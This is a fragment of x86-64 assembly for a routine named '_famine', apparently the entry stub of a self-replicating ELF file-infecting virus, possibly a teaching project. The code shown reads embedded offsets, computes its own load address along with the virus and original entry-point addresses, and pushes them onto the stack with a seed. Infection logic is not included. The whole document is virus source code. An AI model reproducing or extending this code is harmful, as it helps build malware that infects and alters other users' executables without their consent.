
section .text
global _famine

_famine:
pop rax
push rdx                   ; backup rdx
push r14                   ; backup r14

mov rdx, rax

mov r8, rdx
mov r9, rdx
mov r10, rdx
mov r11, rdx
mov r14, rdx
add r8, 16                 ; align vars to correct addresses
add r9, 24
add r10, 32
add r11, 40
add r14, 48
mov r8, [r8]               ; dereference vars
mov r9, [r9]
mov r10, [r10]
mov r11, [r11]
mov r14, [r14]

mov rax, rdx               ; get famine_entry addr
sub rax, 0x5

push r15                   ; backup r15
mov r15, rax
xchg r15, r8
sub r8, r15                ; r8 = rax - r8
mov r15, rax
xchg r15, r10
add r10, r15               ; r10 = rax + r10
mov r15, rax
xchg r15, r11
sub r11, r15               ; r11 = rax - r11
pop r15                    ; restore r15

push rax                   ; save famine_entry  [rsp + 40]
push r8                    ; save ptld addr     [rsp + 32]
push r9                    ; save ptld size     [rsp + 24]
push r10                   ; save virus addr    [rsp + 16]
push r11                   ; save entry addr    [rsp + 8]
push rdx                   ; save seed          [rsp]
